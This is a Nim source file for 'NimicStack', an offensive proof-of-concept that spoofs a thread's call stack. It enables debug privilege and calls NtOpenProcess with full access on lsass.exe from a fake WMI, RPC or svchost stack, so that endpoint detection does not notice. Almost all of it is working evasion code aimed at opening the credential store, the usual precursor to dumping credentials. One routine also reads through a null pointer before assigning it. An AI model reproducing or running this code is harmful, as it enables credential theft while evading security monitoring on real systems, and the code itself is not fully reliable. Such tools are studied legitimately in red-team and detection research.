import winim
import ptr_math
import system
import os
import tables
import Structs
import CallStacks

var selectedStackFrame:seq[HelperStackFrame] = @[]
var dllAddressMap = initTable[string, uint64]()
var context:CONTEXT

proc PrintBanner():void = 
    var banner = """

███╗   ██╗██╗███╗   ███╗██╗ ██████╗███████╗████████╗ █████╗  ██████╗██╗  ██╗
████╗  ██║██║████╗ ████║██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██╔██╗ ██║██║██╔████╔██║██║██║     ███████╗   ██║   ███████║██║     █████╔╝ 
██║╚██╗██║██║██║╚██╔╝██║██║██║     ╚════██║   ██║   ██╔══██║██║     ██╔═██╗ 
██║ ╚████║██║██║ ╚═╝ ██║██║╚██████╗███████║   ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝ ╚═════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                            
                                @R0h1rr1m                                       
"""
    echo banner

proc DisplayHelp():void = 
    echo "[!] Usage: ",getAppFilename()," <--wmi, --rpc, --svchost>"

proc SetSelectedFrame(givenOption:string):bool =
    if(givenOption == "--wmi"):
        selectedStackFrame = wmiCallStack
    elif(givenOption == "--rpc"):
        selectedStackFrame = rpcCallStack
    elif(givenOption == "--svchost"):
        selectedStackFrame = svchostCallStack
    else:
        return false
    return true

proc GetImageBase(libraryName:string,requiresLoadLibrary:bool):bool = 
    var imageBaseAddr:uint64 = 0
    if(dllAddressMap.hasKey(libraryName)):
        return true
    if(requiresLoadLibrary):
        imageBaseAddr = cast[uint64](LoadLibraryA(libraryName))
        if(imageBaseAddr == 0):
            echo "[!] Error on loading library: ",libraryName," !"
            return false
    if(imageBaseAddr == 0):
        imageBaseAddr = cast[uint64](GetModuleHandle(libraryName))
        if(imageBaseAddr == 0):
            echo "[!] Error on geting handle to the library: ",libraryName," !"
            return false
    dllAddressMap[libraryName] = imageBaseAddr
    return true
    
proc CalculateReturnAddress(indexToStackFrame:int):bool =
    var returnValue:bool = true
    try:
        var imageBaseAddr:uint64 = dllAddressMap[selectedStackFrame[indexToStackFrame].dllName]
        if(imageBaseAddr == 0):
            returnValue = false
        else:
            selectedStackFrame[indexToStackFrame].returnAddress = imageBaseAddr + selectedStackFrame[indexToStackFrame].offset
    except:
        echo "[!] Error for calculating return address: ",selectedStackFrame[indexToStackFrame].dllName
        returnValue = false
    return returnValue

proc CalculateFunctionStackSize(pRuntimeFunction:PRUNTIME_FUNCTION,imageBase:DWORD64,indexToStackFrame:int):bool = 
    var returnValue:bool = true
    var pUnwindInfo:ptr UNWIND_INFO = nil
    var unwindOperation:uint = 0
    var operationInfo:uint64 = 0
    var numberOfOpCode:int = cast[int](pUnwindInfo.countOfCodes)
    var unwindDataIndex:int = 0
    var frameOffset:uint = 0
    var pRuntimeFunctionTemp:PRUNTIME_FUNCTION = nil
    pUnwindInfo = cast[ptr UNWIND_INFO](imageBase + pRuntimeFunction.UnwindData)
    if(cast[uint64](pRuntimeFunction) == 0):
        return false
    # Loop over unwind data
    while(unwindDataIndex < numberOfOpCode):
        # I guess it is a struct that has a pointer at the end of it so all op codes starts from the end of the struct
        unwindOperation = pUnwindInfo.unwindCode[unwindDataIndex].innerStruct.unwindOp
        operationInfo = pUnwindInfo.unwindCode[unwindDataIndex].innerStruct.opInfo
        case cast[UNWIND_CODE_OPS](unwindOperation):
            # Need check on debug TODO
            of UWOP_PUSH_NONVOL:
                # UWOP_PUSH_NONVOL is 8 bytes.
                selectedStackFrame[indexToStackFrame].totalStackSize+=8
                # Record if it pushes rbp
                if(operationInfo == RBP_OP_INFO):
                    selectedStackFrame[indexToStackFrame].pushRbp = true
                    selectedStackFrame[indexToStackFrame].countOfCodes = cast[int](pUnwindInfo.countOfCodes)
                    selectedStackFrame[indexToStackFrame].pushRbpIndex = unwindDataIndex + 1
            of UWOP_SAVE_NONVOL:
                # Just increase index  
                unwindDataIndex += 1
            of UWOP_ALLOC_SMALL:
                # Alloc size is op info field * 8 + 8.
                selectedStackFrame[indexToStackFrame].totalStackSize += ((operationInfo * 8) + 8);
            of UWOP_ALLOC_LARGE:
                #[
                    // Alloc large is either:
                    // 1) If op info == 0 then size of alloc / 8
                    // is in the next slot (i.e. index += 1).
                    // 2) If op info == 1 then size is in next
                    // two slots.
                ]#
                unwindDataIndex += 1
                frameOffset = pUnwindInfo.unwindCode[unwindDataIndex].frameOffset
                if(operationInfo == 0):
                    frameOffset *= 8
                else:
                    unwindDataIndex += 1
                    # Why shl 16 ? Does this make it 0?
                    frameOffset += (pUnwindInfo.unwindCode[unwindDataIndex].frameOffset shl 16);
                selectedStackFrame[indexToStackFrame].totalStackSize += frameOffset
            of UWOP_SET_FPREG:
                #[
                    This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                    that rbp is the expected value (in the frame above) when
                    it comes to spoof this frame in order to ensure the
                    call stack is correctly unwound.
                ]#
                selectedStackFrame[indexToStackFrame].setsFramePointer = true
            else:
                echo "[!] Unknown unwind code !"
                return false
        unwindDataIndex += 1
    if((pUnwindInfo.flags and UNW_FLAG_CHAININFO) != 0):
        unwindDataIndex = cast[int](pUnwindInfo.countOfCodes)
        if( (unwindDataIndex and 1) != 0):
            unwindDataIndex+=1
        pRuntimeFunctionTemp = cast[PRUNTIME_FUNCTION](addr(pUnwindInfo.unwindCode[unwindDataIndex]))
        return CalculateFunctionStackSize(pRuntimeFunctionTemp, imageBase, indexToStackFrame);
    selectedStackFrame[indexToStackFrame].totalStackSize += 8
    return returnValue

proc CalculateFunctionStackSizeWrapper(indexToStackFrame:int):bool = 
    var returnValue:bool = false
    var pRuntimeFunction:PRUNTIME_FUNCTION = nil
    var pHistoryTable:PUNWIND_HISTORY_TABLE = nil
    var imageBase:DWORD64 = 0
    if(selectedStackFrame[indexToStackFrame].returnAddress == 0):
        return returnValue
    # Searches the active function tables for an entry that corresponds to the specified PC value.
    pRuntimeFunction = RtlLookupFunctionEntry(cast[DWORD64](selectedStackFrame[indexToStackFrame].returnAddress), addr(imageBase),pHistoryTable)
    if(pRuntimeFunction == nil):
        return returnValue
    returnValue = CalculateFunctionStackSize(pRuntimeFunction,imageBase,indexToStackFrame)
    return returnValue


proc PrepareRequiredLibraries():bool = 
    var returnValue:bool = true
    for seqIndex,helperStackValue in selectedStackFrame:
        if(not GetImageBase(helperStackValue.dllName,helperStackValue.requiresLoadLibrary)):
            returnValue = false
            break
        if(not CalculateReturnAddress(seqIndex)):
            returnValue = false
            break
        if(not CalculateFunctionStackSizeWrapper(seqIndex)):
            returnValue = false
            break
    return returnValue

proc ArrangeSePrivilege(privilegeName:string,enableFlag:bool):bool =
    var returnValue:bool = true
    var tokenPrivileges:TOKEN_PRIVILEGES
    var luid:LUID
    var tokenHandle:HANDLE
    if (not OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle)):
        echo "[!] Failed to OpenProcessToken!"
        return false
    if (not LookupPrivilegeValue(NULL, privilegeName, addr luid)):
        echo "[!] LookupPrivilegeValue error!" 
        return false
    tokenPrivileges.PrivilegeCount = 1
    tokenPrivileges.Privileges[0].Luid = luid
    if (enableFlag):
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    else:
        tokenPrivileges.Privileges[0].Attributes = 0
    if (0 == AdjustTokenPrivileges(tokenHandle,FALSE,addr tokenPrivileges,cast[DWORD](sizeof(TOKEN_PRIVILEGES)),cast [PTOKEN_PRIVILEGES](NULL),cast [PDWORD](NULL))):
        echo "[!] AdjustTokenPrivileges error!"
        return false
    if(GetLastError() == ERROR_NOT_ALL_ASSIGNED):
        echo "[!] AdjustTokenPrivileges error!"
        returnValue = false
    return returnValue

proc DummyFunction(lpParam:LPVOID):DWORD {.stdcall.}= 
    echo "[+] Hello from dummy"
    return 0

proc PushtoStack(value:ULONG64):void =
    context.Rsp = cast[ULONG64](cast[uint64](context.Rsp)-0x8)
    var AddressToWrite:PULONG64 = cast[PULONG64](context.Rsp)
    AddressToWrite[] = value

proc InitializeFakeThreadStack():void = 
    var childSp:ULONG64 = 0
    var bPreviousFrameSetUWOP_SET_FPREG:bool = false
    # Set last return address to 0 --> Stack is already initialized because of the suspended threat
    PushToStack(0)
    #[
     Directly copy and paste from VulcanRaven :D 
     Loop through target call stack *backwards*
     and modify the stack so it resembles the fake
     call stack e.g. essentially making the top of
     the fake stack look like the diagram below:
          |                |
           ----------------
          |  RET ADDRESS   |
           ----------------
          |                |
          |     Unwind     |
          |     Stack      |
          |      Size      |
          |                |
           ----------------
          |  RET ADDRESS   |
           ----------------
          |                |
          |     Unwind     |
          |     Stack      |
          |      Size      |
          |                |
           ----------------
          |   RET ADDRESS  |
           ----------------   <--- RSP when NtOpenProcess is called
    ]#
    for i in countdown(selectedStackFrame.len - 1 ,0):
        #[
            Check if the last frame set UWOP_SET_FPREG.
            If the previous frame uses the UWOP_SET_FPREG
            op, it will reset the stack pointer to rbp.
            Therefore, we need to find the next function in
            the chain which pushes rbp and make sure it writes
            the correct value to the stack so it is propagated
            to the frame after that needs it (otherwise stackwalk
            will fail). The required value is the childSP
            of the function that used UWOP_SET_FPREG (i.e. the
            value of RSP after it is done adjusting the stack and
            before it pushes its RET address).
        ]#
        if(bPreviousFrameSetUWOP_SET_FPREG and selectedStackFrame[i].pushRbp):
            #[
                Check when RBP was pushed to the stack in function
                prologue. UWOP_PUSH_NONVOls will always be last:
                "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
                unwind codes must appear first in the prolog and
                correspondingly, last in the unwind code array."
                Hence, subtract the push rbp code index from the
                total count to work out when it is pushed onto stack.
                E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
                RPCRT4!LrpcIoComplete:
                00007ffd`b342b480 4053            push    rbx
                00007ffd`b342b482 55              push    rbp
                00007ffd`b342b483 56              push    rsi
                If diff == 0, rbp is pushed first etc.    
            ]#
            var diff = selectedStackFrame[i].countOfCodes - selectedStackFrame[i].pushRbpIndex
            var tmpStackSizeCounter:int = 0
            for j in countup(0,diff-1):
                # Push rbx
                PushToStack(0x0)
                tmpStackSizeCounter+=0x8
            # Push rbp
            PushToStack(childSp)
            # Minus off the remaining function stack size and continue unwinding.
            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize - cast[uint64]((tmpStackSizeCounter + 0x8)))
            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
            #[
             From my testing it seems you only need to get rbp
             right for the next available frame in the chain which pushes it.
             Hence, there can be a frame in between which does not push rbp.
             Ergo set this to false once you have resolved rbp for frame
             which needed it. This is pretty flimsy though so this assumption
             may break for other more complicated examples.
            ]#
            bPreviousFrameSetUWOP_SET_FPREG = false
        else:
            # If normal frame, decrement total stack size and write RET address
            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize)
            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
        #[
         Check if the current function sets frame pointer
         when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
         and record its childSP.
        ]#
        if(selectedStackFrame[i].setsFramePointer):
            childSp = context.Rsp
            childSp += 0x8
            bPreviousFrameSetUWOP_SET_FPREG = true


proc GetLsassPid():DWORD = 
    var processEntry:PROCESSENTRY32A
    var snapshot:HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
    if(snapshot == INVALID_HANDLE_VALUE):
        return 0
    if(Process32FirstA(snapshot,addr processEntry)):
        while($(processEntry.szExeFile) != "lsass.exe"):
            Process32NextA(snapshot,addr processEntry)
    return processEntry.th32ProcessID

proc VehCallback(exceptionInfo:PEXCEPTION_POINTERS):LONG {.stdcall.} =
    var exceptionCode:ULONG = exceptionInfo.ExceptionRecord.ExceptionCode
    if(exceptionCode != STATUS_ACCESS_VIOLATION):
        return EXCEPTION_CONTINUE_SEARCH
    if(exceptionCode == STATUS_ACCESS_VIOLATION):
        echo "[+] Veh is called!"
        echo "[+] Redirecting thread to RtlExitUserThread"
        exceptionInfo.ContextRecord.Rip = cast[DWORD64](GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlExitUserThread"))
        exceptionInfo.ContextRecord.Rcx = 0
        return EXCEPTION_CONTINUE_EXECUTION
    return EXCEPTION_CONTINUE_EXECUTION

when isMainModule:
    var dwThreadId:DWORD  = 0
    var hThread:HANDLE = 0
    var hLsass:HANDLE = 0
    var objectAttr:OBJECT_ATTRIBUTES 
    var clientID:CLIENT_ID
    PrintBanner()
    if(paramCount() != 1):
        DisplayHelp()
        quit(-1)
    if(not SetSelectedFrame(paramStr(1))):
        echo "[!] Invalid call stack option is selected! [",paramStr(1),"]"
        quit(-1)
    echo "[+] ",paramStr(1)[2..paramStr(1).len-1], " frame is selected!"
    if(not PrepareRequiredLibraries()):
        echo "[!] Error on stack frame preparation!"
        quit(-1)
    # Needs debug privileges for lsass access poc
    if(not ArrangeSePrivilege(SE_DEBUG_NAME,true)):
        echo "[!] Error on enabling SeDebugPrivilege (Run the program as admin)!"
        quit(-1)
    hThread = CreateThread(NULL,MAX_STACK_SIZE,DummyFunction,cast[LPVOID](0),CREATE_SUSPENDED,addr dwThreadId)
    if (0 == hThread):
        echo "[!] Failed to create suspended thread"
        quit(-1)    
    context.ContextFlags = CONTEXT_FULL
    if(0 == GetThreadContext(hThread, addr context)):
        echo "[!] Error on GetThreadContext!"
        quit(-1)
    InitializeFakeThreadStack()

    context.Rcx = cast[DWORD64](addr hLsass)
    context.Rdx = cast[DWORD64](PROCESS_ALL_ACCESS)
    objectAttr.Length = cast[ULONG](sizeof(OBJECT_ATTRIBUTES))
    objectAttr.RootDirectory = 0
    objectAttr.Attributes = 0
    objectAttr.ObjectName = NULL
    objectAttr.SecurityDescriptor = NULL
    objectAttr.SecurityQualityOfService = NULL
    context.R8 = cast[DWORD64](addr objectAttr)
    clientID.UniqueProcess = cast[HANDLE](GetLsassPid())
    clientID.UniqueThread = 0
    context.R9 = cast[DWORD64](addr clientID)
    context.Rip = cast[DWORD64](GetProcAddress(GetModuleHandle("ntdll"),"NtOpenProcess"))
    if(SetThreadContext(hThread,addr context) == 0):
        echo "[!] Failed to set thread context!"
        quit(-1)
    
    if(cast[uint64](AddVectoredExceptionHandler(1,cast[PVECTORED_EXCEPTION_HANDLER](VehCallback))) == 0):
        echo "[!] Failed to add vectored exception handler!"
        quit(-1)

    if(ResumeThread(hThread) == -1):
        echo "[!] Failed to resume suspended thread!"
        quit(-1)

    Sleep(5000)
    if(hLsass == 0):
        echo "[!] Error on obtaining handle to lsass"
        quit(-1)
    else:
        echo "[%] Spoof is successful"